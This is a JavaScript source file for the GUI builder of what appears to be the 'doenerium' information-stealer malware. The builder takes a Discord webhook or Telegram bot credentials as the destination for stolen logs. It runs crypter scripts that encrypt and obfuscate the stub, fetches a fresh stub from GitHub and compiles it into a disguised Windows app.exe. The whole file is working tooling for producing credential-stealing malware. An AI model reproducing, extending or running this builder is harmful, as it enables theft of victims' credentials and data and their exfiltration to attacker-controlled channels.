const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');

const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn');

togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});

function getbindURL() {
    return new Promise((resolve, reject) => {
        const filePath = path.resolve(__dirname, 'link.json');
        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('Error reading link.json:', err);
                resolve('none');
                return;
            }

            try {
                const jsonData = JSON.parse(data);
                resolve(jsonData.url || 'none');
            } catch (parseError) {
                console.error('Error parsing link.json:', parseError);
                resolve('none');
            }
        });
    });
}

function displayMessages(messages, index = 0) {
    if (index >= messages.length) return;
    outputBox.innerHTML += messages[index] + '<br>';
    outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
    setTimeout(() => displayMessages(messages, index + 1), 1000);
}

function runScriptFile(scriptFilePath, showOutputOnSuccess = false) {
    return new Promise((resolve, reject) => {
        exec(`node "${scriptFilePath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing ${scriptFilePath}: ${error}`);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error executing ${scriptFilePath}: ${error.message}<br>`;
                outputBox.innerHTML += `<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}<br>`;
                reject(error);
                return;
            }
            if (stderr) {
                console.error(`stderr Error: ${stderr}`);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> stderr Error: ${stderr}<br>`;
                outputBox.innerHTML += `<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}<br>`;
                reject(new Error(stderr));
                return;
            }

            if (showOutputOnSuccess) {
                const filteredOutput = stdout.split('\n').filter(line => !line.includes('add:') && !line.includes('del:') && !line.includes('not found:')).join('\n');
                outputBox.innerHTML += `<i class='bx bx-check-square' style='color:#00ff0f'></i> ${scriptFilePath} was executed successfully.<br>`;
                outputBox.innerHTML += `<i class='bx bx-file' style='color:#000000'></i> Output: ${filteredOutput.replace(/\n/g, '<br>')}<br>`;
            }
            resolve();
        });
    });
}

function resetStubFile() {
    return new Promise((resolve, reject) => {
        const filePath = path.resolve(__dirname, '..', '..', 'stub', 'stub.js');
        const url = 'https://raw.githubusercontent.com/oc4tche/doenerium6969-unhooked/refs/heads/main/stub/stub.js';

        fs.unlink(filePath, err => {
            if (err && err.code !== 'ENOENT') {
                console.error('Error deleting stub.js:', err);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error deleting stub.js: ${err.message}<br>`;
                outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
                reject(err);
                return;
            }

            const file = fs.createWriteStream(filePath);
            https.get(url, response => {
                response.pipe(file);
                file.on('finish', () => {
                    file.close(() => {
                        console.log('stub.js has been reset.');
                        outputBox.innerHTML += `<i class='bx bx-check-square' style='color:#00ff0f'></i> stub.js has been reset to its original state.<br>`;
                        outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
                        resolve();
                    });
                });
            }).on('error', err => {
                fs.unlink(filePath);
                console.error('Error resetting stub.js:', err);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error resetting stub.js: ${err.message}<br>`;
                outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
                reject(err);
            });
        });
    });
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function build() {
    return new Promise((resolve, reject) => {
        const buildBatPath = path.resolve(__dirname, '..', '..', 'build');
        const command = `pkg . --output app.exe --targets node14-win-x64 --compress=GZip`;

        exec(command, { cwd: buildBatPath, env: { ...process.env, NODE_NO_WARNINGS: '1' } }, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing pkg command: ${error}`);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error executing pkg command: ${error.message}<br>`;
                outputBox.innerHTML += `<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}<br>`;
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> stderr Output: ${stderr.replace(/\n/g, '<br>')}<br>`;
                outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
                reject(error);
                return;
            }
            if (stderr) {
                console.error(`stderr Error: ${stderr}`);
                outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> stderr Error: ${stderr}<br>`;
                outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
                reject(new Error(stderr));
                return;
            }
            console.log('pkg command executed successfully.');
            outputBox.innerHTML += `<i class='bx bx-check-square' style='color:#00ff0f'></i> Compilation Completed Successfully !<br>`;
            outputBox.innerHTML += `<i class='bx bx-help-circle' style='color:#6699CC'></i> Click the button in the top right to change the EXE resources.<br>`;
            outputBox.scrollTop = outputBox.scrollHeight - outputBox.clientHeight;
            document.getElementById('helpButton').style.display = 'inline-block';
            resolve();
        });
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const buildButton = document.querySelector('label[for="fileInput"]');
    const outputBox = document.getElementById('outputBox');
    const helpButton = document.getElementById('helpButton');
    const newButton = document.getElementById('newButton');

    helpButton.style.display = 'none';
    newButton.style.display = 'none';

    function checkInfo() {
        const discordWebhookURL = localStorage.getItem('discordWebhookURL');
        const telegramBotToken = localStorage.getItem('telegramBotToken');
        const telegramChatID = localStorage.getItem('telegramChatID');

        if (discordWebhookURL) {
            return { method: 'Discord Webhook', discordWebhookURL };
        } else if (telegramBotToken && telegramChatID) {
            return { method: 'Telegram Bot', telegramBotToken, telegramChatID };
        } else {
            return null;
        }
    }

    function getCheckboxStates() {
        return new Promise((resolve, reject) => {
            const filePath = path.resolve(__dirname, 'checkbox.json');
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error('Error reading checkbox.json:', err);
                    reject(err);
                    return;
                }

                try {
                    const jsonData = JSON.parse(data);
                    resolve(jsonData);
                } catch (parseError) {
                    console.error('Error parsing checkbox.json:', parseError);
                    reject(parseError);
                }
            });
        });
    }

    function findAppExe() {
        return new Promise((resolve, reject) => {
            const dirsToCheck = [path.resolve(__dirname, '../../'), path.resolve(__dirname, '../')];
            let foundPath = null;
            for (const dir of dirsToCheck) {
                const filePath = path.join(dir, 'app.exe');
                if (fs.existsSync(filePath)) {
                    foundPath = filePath;
                    break;
                }
            }
            if (foundPath) {
                resolve(foundPath);
            } else {
                reject(new Error('app.exe not found'));
            }
        });
    }

    function displayMessages(messages) {
        let index = 0;
        function showNextMessage() {
            if (index < messages.length) {
                outputBox.innerHTML += messages[index] + '<br>';
                index++;
                setTimeout(showNextMessage, 1000);
            }
        }

        showNextMessage();
    }

    buildButton.addEventListener('click', () => {
        const info = checkInfo();
        getCheckboxStates().then(checkboxStates => {
            const checkedCheckboxIDs = Object.keys(checkboxStates).filter(id => checkboxStates[id]);
            const checkedCheckboxIDsStr = checkedCheckboxIDs.join(' | ');
            getbindURL().then(bindURL => {
                const bindURLMessage = `Binded URL: ${bindURL}`;
                let messages = [
                    `<i class='bx bx-check-square' style='color:#00ff0f'></i> Build initialized!`,
                    `<i class='bx bx-check-square' style='color:#00ff0f'></i> Features Saved!`,
                    `<i class='bx bx-check-square' style='color:#00ff0f'></i> Method: ${info.method}`,
                    `<i class='bx bx-check-square' style='color:#00ff0f'></i> Features chosen: ${checkedCheckboxIDsStr}`, 
                    `<i class='bx bx-check-square' style='color:#00ff0f'></i> ${bindURLMessage}`
                ];

                if (info) {
                    const { method, discordWebhookURL, telegramBotToken, telegramChatID } = info;
                    outputBox.innerHTML = '';
                    displayMessages(messages);
                    const featuresFilePath = path.resolve(__dirname, '../../stub/features.js');
                    runScriptFile(featuresFilePath, false)
                        .then(() => {
                            let scriptFilePath;
                            if (method === 'Discord Webhook') {
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Discord Webhook URL: ${discordWebhookURL}`);
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> AES256 Encryption Success!`);
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> JS Confuser Encryption Success!`);
                                scriptFilePath = path.resolve(__dirname, '../../stub/crypter.js');
                            } else if (method === 'Telegram Bot') {
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Telegram Bot Token: ${telegramBotToken}`);
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Telegram Chat ID: ${telegramChatID}`);
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> AES256 Encryption Success!`);
                                messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> JS Confuser Encryption Success!`);
                                scriptFilePath = path.resolve(__dirname, '../../stub/cryptertele.js');
                            }
                            if (scriptFilePath) {
                                return runScriptFile(scriptFilePath);
                            } else {
                                throw new Error('No valid script file path provided');
                            }
                        })
                        .then(() => delay(6500))
                        .then(() => resetStubFile())
                        .then(() => build())
                        .then(() => {
                            helpButton.style.display = 'block';
                            newButton.style.display = 'block';
                        })
                        .catch(error => {
                            console.error('Error during build process:', error);
                            outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error during build process: ${error.message}<br>`;
                        });
                } else {
                    alert('Please enter and save your Discord Webhook URL or Telegram Bot Token and Chat ID in the "Log info" page.');
                }
            });
        }).catch(error => {
            console.error('Error getting checkbox states:', error);
            outputBox.innerHTML += `<i class='bx bx-error' style='color:#ff0000'></i> Error getting checkbox states: ${error.message}<br>`;
        });
    });

    function handleButtonClick() {
    findAppExe()
        .then(filePath => {
            alert(`Full path of the app.exe file: ${filePath}`);
        })
        .catch(error => {
            alert(`Error: ${error.message}`);
        });
}

helpButton.addEventListener('click', () => {
    console.log('Button clicked');
    const scriptPath = path.resolve(__dirname, '..', 'run_ressources.bat');
    exec(`"${scriptPath}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing batch script: ${error.message}`);
            alert(`Error executing batch script: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr error: ${stderr}`);
            alert(`stderr error: ${stderr}`);
            return;
        }
        helpButton.style.display = 'none';
        newButton.style.display = 'none';
    });
});

newButton.addEventListener('click', () => {
    const defaultPath = path.resolve(__dirname, '..', 'default.bat');
    exec(`"${defaultPath}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing default batch: ${error.message}`);
            alert(`Error executing default batch: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr error: ${stderr}`);
            alert(`stderr error: ${stderr}`);
            return;
        }
        helpButton.style.display = 'none';
        newButton.style.display = 'none';
    });
});
});
